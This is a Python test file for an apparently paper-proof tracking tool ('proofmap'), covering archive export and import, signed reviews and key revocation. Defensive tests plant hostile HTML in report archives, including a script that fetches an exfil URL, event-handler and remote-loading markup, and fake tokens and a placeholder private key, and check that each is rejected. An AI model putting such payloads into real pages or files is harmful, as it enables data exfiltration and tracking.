def test_rehashed_active_html_rejected_before_report_extraction(tmp_path):
    from proofmap.integrity import artifact_digest

    identity = {"source_fingerprint": "a" * 64, "tree": "b" * 40, "package_version": "0.8.0a1"}
    report = tmp_path / "qualification.json"
    report.write_bytes(canonical_bytes({"report": "retained"}))
    archive = tmp_path / "retained.zip"
    preserve_qualification({"report.json": report}, archive, identity=identity)
    with zipfile.ZipFile(archive) as reader:
        manifest = strict_loads(reader.read("manifest.json"))
        payloads = {
            member.filename: reader.read(member)
            for member in reader.infolist()
            if member.filename != "manifest.json"
        }
    payloads["report/evil.html"] = b"<script>fetch('https://example.invalid/exfil')</script>"
    manifest["inventory"] = [
        {"path": name, "sha256": artifact_digest(raw), "size": len(raw)}
        for name, raw in payloads.items()
    ]
    manifest.pop("id")
    manifest["id"] = digest("campaign-export-manifest.v1", manifest)
    with zipfile.ZipFile(archive, "w") as writer:
        writer.writestr("manifest.json", canonical_bytes(manifest))
        for name, raw in payloads.items():
            writer.writestr(name, raw)
    with pytest.raises(ValueError, match="ACTIVE_REPORT_CONTENT"):
        extract_dossier_report(archive, tmp_path / "unsafe-report")
    assert not (tmp_path / "unsafe-report").exists()


def test_source_stage_export_uses_retained_bytes_after_local_path_removed(tmp_path):
    store = CampaignStore(tmp_path / "source-stage")
    restored = CampaignStore(tmp_path / "source-restored")
    try:
        policy = operation_policy(allowed_kinds=["INGEST_SOURCE"], source_roots=[str(tmp_path)])
        campaign_id = initialize(
            store, "Pending intake", "Retain exactly requested source", policy=policy
        )["campaign_id"]
        source = tmp_path / "pending.tex"
        raw = rb"\begin{theorem}For every $x\in\mathbb{Z}$, $x=x$.\end{theorem}"
        source.write_bytes(raw)
        request_stage(
            store, campaign_id, "INGEST_SOURCE", {"source_path": str(source)}, policy, "operator"
        )
        source.unlink()
        report = campaign_report_model(store, campaign_id)
        assert report["tasks"][0]["target"]["source_path"] == "[LOCAL_CONFIGURATION_REDACTED]"
        assert str(source) not in canonical_bytes(report).decode("utf-8")
        archive = tmp_path / "pending-source.zip"
        export_campaign(store, campaign_id, archive, include_source=True)
        import_campaign(archive, restored)
        task = queue.tasks(restored, campaign_id)[0]
        assert task["state"] == "STALE"
        retained = next(iter(task["source_material"]["artifacts"].values()))
        assert restored.get(retained) == raw
        assert audit_campaign(restored, campaign_id)["integrity"] == "PASS"
    finally:
        restored.close()
        store.close()


def test_current_report_aligns_paper_ledger_without_cached_authority(
    tmp_path, _vanilla_campaign_baseline
):
    import test_execution as fixture

    store, campaign_id, _, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    try:
        before = store.db.total_changes
        model = write_campaign_report(
            store,
            campaign_id,
            tmp_path / "current",
            execution_profile=fixture.profile().to_dict(),
            trust_store={"schema_version": "2.0", "keys": []},
            evaluation_time="2026-10-02T00:00:00Z",
        )
        assert model["assessment_scope"] == "CURRENT_AUTHORITY_EVALUATION"
        assert model["coverage"]["accepted"] == model["coverage"]["verified"] == 0
        for paper in model["papers"]:
            coverage = paper["outcomes"]["coverage"]
            assert coverage["accepted_claims"] == coverage["kernel_verified"] == 0
            assert paper["outcomes"]["authority_evaluation_time"] == model["evaluation_time"]
            for claim in paper["claims"]:
                node = next(
                    node for node in model["graph"]["nodes"] if node["id"] == claim["anchor"]
                )
                assert node["assessment"] == claim["current_policy_state"]
                assert node["assessment_provenance"]["evaluation_time"] == model["evaluation_time"]
                assert "records" not in node["assessment_provenance"]
        assert store.db.total_changes == before
    finally:
        store.close()


def test_current_report_prefers_fresh_execution_and_retains_revoked_history(monkeypatch):
    """Simulated execution checks selection contracts; it is not real Lean evidence."""
    import test_core_record_contracts as history_fixture
    import test_execution as fixture

    from proofmap.campaign.reports import _current
    from proofmap.execution import execute

    history, binding, obligation, _, trust = history_fixture.historical_fixture(monkeypatch)
    trust["keys"][0]["revoked"] = True
    private, fresh_authority = fixture.authority(
        "verification-execution", binding.assertion_id, fixture.profile().digest
    )
    fresh_authority["keys"][0]["id"] = "new-controller"
    trust["keys"].extend(fresh_authority["keys"])
    fresh = execute(
        binding,
        obligation,
        b"by grind",
        fixture.profile(),
        controller_id="new-controller",
        private_key=private,
    )
    bundle = {
        "run_manifest": {"run_id": "revised-run"},
        "execution_events": [],
        "formalizations": [
            {
                "status": "SUPPORTED",
                "binding": binding.to_dict(),
                "obligation": obligation.to_dict(),
                "historical_execution": history,
            }
        ],
    }
    before = canonical_bytes(bundle)

    class AuditStore:
        include_fresh = False

        def list_audit(self, run_id, kind):
            assert run_id == "revised-run"
            return (
                [{"record": fresh["event"], "envelope": fresh["envelope"]}]
                if self.include_fresh and kind == "ExecutionEvent"
                else []
            )

    store = AuditStore()
    arguments = (store, bundle, fixture.profile().to_dict(), trust, "2026-10-02T00:00:00Z")
    old = _current(*arguments)["records"][0]
    assert old["assessment"] == "UNVERIFIED"
    store.include_fresh = True
    current = _current(*arguments)["records"][0]
    assert current["assessment"] == "REVIEW_REQUIRED"
    assert current["execution_digest"] == fresh["event"]["id"]
    assert canonical_bytes(bundle) == before


def test_failed_import_transaction_exposes_no_campaign_or_dispatchable_task(
    tmp_path, monkeypatch, _vanilla_campaign_baseline
):
    from proofmap.campaign import portable

    store, campaign_id, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    destination = CampaignStore(tmp_path / "rollback")
    try:
        make_task(store, campaign_id, refs[0])
        archive = tmp_path / "rollback.zip"
        export_campaign(store, campaign_id, archive, include_source=True)
        original = portable._fence_import_tasks

        def failed_publication(*args):
            raise OSError("INTERRUPTED_IMPORT_PUBLICATION")

        monkeypatch.setattr(portable, "_fence_import_tasks", failed_publication)
        with pytest.raises(OSError, match="INTERRUPTED_IMPORT_PUBLICATION"):
            import_campaign(archive, destination)
        assert not destination.records(campaign_id)
        assert not queue.tasks(destination, campaign_id)
        assert destination.db.execute("SELECT count(*) FROM campaign_heads").fetchone()[0] == 0
        monkeypatch.setattr(portable, "_fence_import_tasks", original)
        import_campaign(archive, destination)
        assert queue.tasks(destination, campaign_id)[0]["state"] == "STALE"
        assert audit_campaign(destination, campaign_id)["integrity"] == "PASS"
    finally:
        destination.close()
        store.close()


def test_reimport_preserves_later_local_head_and_rejects_divergent_new_archive(
    tmp_path, _vanilla_campaign_baseline
):
    store, campaign_id, _, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    destination = CampaignStore(tmp_path / "divergent")
    try:
        original = tmp_path / "original.zip"
        export_campaign(store, campaign_id, original, include_source=True)
        import_campaign(original, destination)
        add_goal(destination, campaign_id, question="Local follow-up after restore")
        local_head = destination.current_snapshot(campaign_id)["id"]
        before = destination.db.total_changes
        assert import_campaign(original, destination)["unchanged"] is True
        assert destination.current_snapshot(campaign_id)["id"] == local_head
        assert destination.db.total_changes == before
        add_goal(store, campaign_id, question="A different source-store follow-up")
        divergent = tmp_path / "divergent.zip"
        export_campaign(store, campaign_id, divergent, include_source=True)
        objects = sorted(
            path.name for path in (destination.root / "objects").rglob("*") if path.is_file()
        )
        with pytest.raises(ValueError, match="DOSSIER_EXISTING_IMMUTABLE_COLLISION"):
            import_campaign(divergent, destination)
        assert destination.current_snapshot(campaign_id)["id"] == local_head
        assert destination.db.total_changes == before
        assert objects == sorted(
            path.name for path in (destination.root / "objects").rglob("*") if path.is_file()
        )
    finally:
        destination.close()
        store.close()


def test_removed_membership_keeps_exact_old_source_and_excludes_unpromoted_source(
    tmp_path, _vanilla_campaign_baseline
):
    from proofmap.campaign.models import record
    from proofmap.campaign.reports import qualified_anchor
    from proofmap.campaign.service import snapshot_update

    store, campaign_id, refs, source = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    try:
        current = store.current_snapshot(campaign_id)
        initial = store.records(campaign_id, "CampaignSnapshot")[0]
        added = revision_impact(store, campaign_id, initial["id"], current["id"], persist=False)
        assert {paper["membership"] for paper in added["papers"]} == {"ADDED"}
        task = make_task(store, campaign_id, refs[0])
        candidate_relation(
            store, campaign_id, *refs, relation="CITES", reason="Inspect both exact sources"
        )
        remaining = [
            selection
            for selection in current["selections"]
            if selection["run_id"] == refs[1]["run_id"]
        ]
        removed = snapshot_update(
            store,
            campaign_id,
            selections=remaining,
            policy=operation_policy(max_attempts=3),
            reason="REMOVE_ONE_MEMBER",
        )
        impact = revision_impact(store, campaign_id, current["id"], removed["id"], persist=False)
        assert {paper["membership"] for paper in impact["papers"]} == {"REMOVED", "UNCHANGED"}
        assert impact["policy_reassessment_required"] is True
        assert task["id"] in {row["task_id"] for row in impact["affected_tasks"]}
        assert impact["unresolved_goals"]
        extra = source / "unpromoted.tex"
        extra.write_text(
            r"\begin{theorem}For every $z\in\mathbb{Z}$, $z+0=z$.\end{theorem}", encoding="utf-8"
        )
        other = initialize(store, "Separate intake", "Source for a losing snapshot publication")[
            "campaign_id"
        ]
        ingest(store, other, extra)
        other_snapshot = store.current_snapshot(other)
        losing = record(
            "CampaignSnapshot",
            **{
                key: value
                for key, value in removed.items()
                if key not in {"kind", "id", "schema_version", "selections", "parent_snapshot"}
            },
            selections=other_snapshot["selections"],
            parent_snapshot=removed["id"],
        )
        store.add_record(losing, campaign_id)
        with pytest.raises(ValueError, match="REVISION_IMPACT_SNAPSHOT_CAMPAIGN"):
            revision_impact(store, campaign_id, removed["id"], other_snapshot["id"], persist=False)
        before = store.db.total_changes
        model = write_campaign_report(store, campaign_id, tmp_path / "removed-report")
        assert model["coverage"]["discovered"] == 1
        assert {paper["selection"]["run_id"] for paper in model["historical_papers"]} == {
            refs[0]["run_id"]
        }
        old_claim = model["historical_papers"][0]["claims"][0]
        assert old_claim["qualified_ref"] == refs[0]
        assert old_claim["current_policy_state"] == "NOT_EVALUATED"
        old_goal = next(goal for goal in model["goals"] if goal["goal"]["target"] == refs[0])
        assert old_goal["state"] == "UNRESOLVED_TARGET"
        assert old_goal["href"] == "#" + qualified_anchor(refs[0])
        assert model["graph"]["edges"][-1]["applicability"] == "HISTORICAL_OR_UNRESOLVED_ENDPOINT"
        assert model["snapshot_publication"][losing["id"]] == "UNPROMOTED_RECORD"
        assert store.db.total_changes == before
        assert (
            tmp_path / "removed-report" / model["historical_papers"][0]["report_path"]
        ).is_file()
    finally:
        store.close()


def test_current_report_requires_fresh_signed_reviews_and_observes_revocation_and_rejection(
    tmp_path, monkeypatch, _vanilla_campaign_baseline
):
    """Simulated Lean output tests trust contracts, never real formal evidence."""
    import test_execution as fixture

    from proofmap.attempts import FormalObligation
    from proofmap.evidence_records import FormalizationBinding, ReviewDecision
    from proofmap.execution import execute
    from proofmap.trust import sign_record

    store, campaign_id, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    try:
        fixture.simulated_execution(monkeypatch)
        formal = store.inspect(refs[0]["run_id"])["bundle"]["formalizations"][0]
        binding = FormalizationBinding.from_dict(formal["binding"])
        obligation = FormalObligation.from_dict(formal["obligation"])
        profile = fixture.profile()
        private, trust = fixture.authority(
            "verification-execution", binding.assertion_id, profile.digest
        )
        trust["keys"][0]["roles"] += ["source-fidelity-review", "formal-fidelity-review"]
        execution = execute(
            binding,
            obligation,
            formal["candidate"].encode("utf-8"),
            profile,
            controller_id="controller",
            private_key=private,
        )
        store.add_audit(
            refs[0]["run_id"], {"record": execution["event"], "envelope": execution["envelope"]}
        )
        decisions = {}
        for dimension in ("source-fidelity", "formal-fidelity"):
            decision = ReviewDecision.create(
                binding=binding,
                profile=profile,
                dimension=dimension,
                decision="APPROVE",
                reviewer_id="controller",
            ).to_dict()
            decisions[dimension] = decision
            store.add_audit(
                refs[0]["run_id"],
                {"record": decision, "envelope": sign_record(decision, private, "controller")},
            )
        inputs = {
            "execution_profile": profile.to_dict(),
            "trust_store": trust,
            "evaluation_time": "2026-10-02T00:00:00Z",
        }
        before = store.db.total_changes
        accepted = campaign_report_model(store, campaign_id, **inputs)
        assert (
            accepted["coverage"]["accepted"]
            == accepted["coverage"]["reviewed"]
            == accepted["coverage"]["verified"]
            == 1
        )
        goal = next(goal for goal in accepted["goals"] if goal["goal"]["target"] == refs[0])
        assert goal["state"] == "ACCEPTED_UNDER_POLICY" and not goal["blockers"]
        assert campaign_report_model(store, campaign_id)["coverage"]["accepted"] == 0
        revoked = deepcopy(trust)
        revoked["keys"][0]["revoked"] = True
        denied = campaign_report_model(store, campaign_id, **{**inputs, "trust_store": revoked})
        assert denied["coverage"]["accepted"] == denied["coverage"]["verified"] == 0
        assert store.db.total_changes == before
        rejection = ReviewDecision.create(
            binding=binding,
            profile=profile,
            dimension="formal-fidelity",
            decision="REJECT",
            reviewer_id="controller",
            supersedes=decisions["formal-fidelity"]["id"],
        ).to_dict()
        store.add_audit(
            refs[0]["run_id"],
            {"record": rejection, "envelope": sign_record(rejection, private, "controller")},
        )
        rejected = campaign_report_model(store, campaign_id, **inputs)
        assert rejected["coverage"]["accepted"] == rejected["coverage"]["reviewed"] == 0
        assert rejected["coverage"]["verified"] == 1
        claim = next(
            claim
            for paper in rejected["papers"]
            for claim in paper["claims"]
            if claim["qualified_ref"] == refs[0]
        )
        assert claim["current_policy_state"] == "REJECTED" and claim["review_state"] == "REJECTED"
    finally:
        store.close()


@pytest.mark.parametrize(
    "attack",
    [
        "identity_only",
        "missing_identity",
        "missing_version",
        "missing_file",
        "secret_identity",
        "secret_json",
        "private_pem",
        "nonportable_name",
    ],
)
def test_failed_qualification_update_preserves_previous_complete_archive(tmp_path, attack):
    report = tmp_path / "observed.json"
    report.write_bytes(canonical_bytes({"software_check": "OBSERVED_UNIT_TEST_OUTPUT"}))
    identity = {
        "source_fingerprint": "a" * 64,
        "tree": "b" * 40,
        "package_version": "0.9.0b1",
        "run_id": "ci-metadata-only",
    }
    archive = tmp_path / "qualification.zip"
    preserve_qualification({"report.json": report}, archive, identity=identity)
    previous = archive.read_bytes()
    files = {"report.json": report}
    replacement = deepcopy(identity)
    if attack == "identity_only":
        files = {}
    elif attack == "missing_identity":
        replacement = {}
    elif attack == "missing_version":
        replacement.pop("package_version")
    elif attack == "missing_file":
        report.unlink()
    elif attack == "secret_identity":
        replacement["runtime"] = {"auth-token": "must-not-travel"}
    elif attack == "secret_json":
        report.write_bytes(
            canonical_bytes({"runtime": {"authorization-header": "must-not-travel"}})
        )
    elif attack == "private_pem":
        report.write_bytes(
            b"-----BEGIN PRIVATE KEY-----\nnot-a-real-key\n-----END PRIVATE KEY-----"
        )
    elif attack == "nonportable_name":
        files = {"unsafe?.json": report}
    with pytest.raises(ValueError):
        preserve_qualification(files, archive, identity=replacement)
    assert archive.read_bytes() == previous
    assert verify_dossier(archive)["integrity"] == "PASS"


def test_author_dependencies_stay_within_qualified_paper_namespaces(tmp_path):
    store = CampaignStore(tmp_path / "author-dependencies")
    try:
        campaign_id = initialize(
            store, "Repeated local labels", "Inspect two independently qualified author arguments"
        )["campaign_id"]
        collection = tmp_path / "author-papers"
        collection.mkdir()
        for name, domain in (("integer", "Z"), ("natural", "N")):
            (collection / (name + ".tex")).write_text(
                r"\documentclass{article}\begin{document}"
                r"\begin{lemma}\label{base}For every $x\in\mathbb{"
                + domain
                + r"}$, $x+0=x$.\end{lemma}"
                r"\begin{proof}Direct calculation.\end{proof}"
                r"\begin{theorem}\label{shift}For every $x\in\mathbb{"
                + domain
                + r"}$, $(x+1)+0=x+1$.\end{theorem}"
                r"\begin{proof}By \ref{base}. Substitute $x+1$ for $x$.\end{proof}\end{document}",
                encoding="utf-8",
            )
        ingest(store, campaign_id, collection)
        before = store.db.total_changes
        model = write_campaign_report(store, campaign_id, tmp_path / "author-report")
        assert store.db.total_changes == before
        assert model["coverage"]["discovered"] == 4
        nodes = {node["id"]: node for node in model["graph"]["nodes"]}
        assert len(nodes) == 4
        dependencies = [
            edge for edge in model["graph"]["edges"] if edge["kind"] == "AUTHOR_DEPENDENCY"
        ]
        assert len(dependencies) == 2
        for edge in dependencies:
            left, right = nodes[edge["from"]]["qualified_ref"], nodes[edge["to"]]["qualified_ref"]
            assert left["run_id"] == right["run_id"] and left["paper_id"] == right["paper_id"]
            assert left["assertion_id"] != right["assertion_id"]
            assert edge["closure_authority"] is False
            bundle = store.inspect(left["run_id"])["bundle"]
            inference = next(
                row
                for row in bundle["argument_map"]["inferences"]
                if row["id"] == edge["inference_id"]
            )
            source = next(
                row
                for row in bundle["document_ir"]["source_inferences"]
                if "author-inference:" + row["id"] == inference["id"]
            )
            assert edge["inference"] == inference
            assert edge["qualified_inference"]["run_id"] == left["run_id"]
            assert edge["qualified_inference"]["inference_digest"] == digest(
                "campaign-inference.v1", inference
            )
            assert edge["source_provenance"]["record"] == source
            assert edge["source_anchors"]["dependency_locators"] == source["source_locators"]
            assert (
                edge["source_anchors"]["endpoints"][left["assertion_id"]]["locator"]
                == (nodes[edge["from"]]["source_anchor"])
            )
            assert edge["support_state"] == "AUTHOR_ASSERTED_UNVERIFIED"
            assert edge["accepted_inferential_support"] is False
            assert edge["assessment_provenance"]["scope"] == "INFERENTIAL_SUPPORT_NOT_AUTHENTICATED"
        assert model["coverage"]["accepted"] == model["coverage"]["verified"] == 0
        assert all(node["assessment"] == "NOT_EVALUATED" for node in nodes.values())
        # Replay a real validated model response proposing the same endpoints.
        # Its provenance remains distinct from the authored source dependency.
        from proofmap.extractor import chunk_document, make_request

        selection = next(
            row
            for row in store.current_snapshot(campaign_id)["selections"]
            if row["paper_id"] == "integer.tex"
        )
        ir = store.inspect(selection["run_id"])["bundle"]["document_ir"]
        chunks, findings = chunk_document(ir)
        assert len(chunks) == 1 and not findings
        dependency = ir["source_inferences"][0]
        config = {
            "provider": "ollama",
            "endpoint": "http://localhost:11434",
            "model": "recorded-dependency-contract",
            "timeout_seconds": 3,
            "max_output_tokens": 512,
        }
        raw = json.dumps(
            {
                "done": True,
                "model": config["model"],
                "message": {
                    "content": json.dumps(
                        {
                            "classifications": [],
                            "dependencies": [
                                {
                                    "conclusion": dependency["conclusion"],
                                    "premises": dependency["premises"],
                                }
                            ],
                        }
                    )
                },
            }
        )
        replay = {
            "request_sha256": artifact_digest(canonical_bytes(make_request(chunks[0], config))),
            "config_digest": digest("extractor-config.v1", config),
            "raw_response": raw,
            "response_sha256": artifact_digest(raw.encode()),
        }
        ingested = ingest(
            store,
            campaign_id,
            collection / "integer.tex",
            paper_id="integer.tex",
            extractor="replay",
            config={"extractor": config},
            replay=replay,
        )
        assert ingested["manuscripts"][0]["exit_code"] == 0
        replayed = campaign_report_model(store, campaign_id)
        model_edge = next(
            edge
            for edge in replayed["graph"]["edges"]
            if edge["kind"] == "MODEL_CANDIDATE_DEPENDENCY"
        )
        source_record = model_edge["source_provenance"]["record"]
        assert (
            source_record["authority"]
            == model_edge["source_provenance"]["origin"]
            == "MODEL_SUGGESTION"
        )
        assert source_record["provenance"]["response_sha256"] == replay["response_sha256"]
        assert model_edge["support_state"] == "MODEL_SUGGESTION_REVIEW_REQUIRED"
        assert (
            model_edge["closure_authority"] is model_edge["accepted_inferential_support"] is False
        )
        assert replayed["coverage"]["accepted"] == replayed["coverage"]["verified"] == 0
    finally:
        store.close()


@pytest.mark.parametrize(
    "markup",
    [
        '<p onclick="alert(1)">Hostile event handler</p>',
        '<p title="one" title="two">Ambiguous attributes</p>',
        '<p style="background:red">Inline attribute</p>',
        '<a href="https://example.invalid/exfil">Remote destination</a>',
        '<meta http-equiv="refresh" content="0;url=https://example.invalid">',
        '<style>@import "https://example.invalid/style.css";</style>',
        "<style>p{background:url(https://example.invalid/tracker)}</style>",
        '<meta http-equiv="Content-Security-Policy" content="default-src *">',
        "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; default-src 'none'; base-uri 'none'; form-action 'none'\">",
    ],
)
def test_rehashed_offline_report_cannot_activate_or_contact_remote_hosts(tmp_path, markup):
    from proofmap.integrity import artifact_digest

    report = tmp_path / "observed.json"
    report.write_bytes(canonical_bytes({"software_check": "RETAINED_OUTPUT"}))
    archive = tmp_path / "hostile-offline.zip"
    preserve_qualification(
        {"observed.json": report},
        archive,
        identity={"source_fingerprint": "a" * 64, "tree": "b" * 40, "package_version": "0.9.0b1"},
    )
    with zipfile.ZipFile(archive) as reader:
        manifest = strict_loads(reader.read("manifest.json"))
        payloads = {
            member.filename: reader.read(member)
            for member in reader.infolist()
            if member.filename != "manifest.json"
        }
    csp = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'\">"
    payloads["report/campaign-report.html"] = ("<!doctype html>" + csp + markup).encode("utf-8")
    manifest["inventory"] = [
        {"path": name, "sha256": artifact_digest(raw), "size": len(raw)}
        for name, raw in sorted(payloads.items())
    ]
    manifest.pop("id")
    manifest["id"] = digest("campaign-export-manifest.v1", manifest)
    with zipfile.ZipFile(archive, "w") as writer:
        writer.writestr("manifest.json", canonical_bytes(manifest))
        for name, raw in payloads.items():
            writer.writestr(name, raw)
    with pytest.raises(ValueError):
        extract_dossier_report(archive, tmp_path / "unpublished")
    assert not (tmp_path / "unpublished").exists()
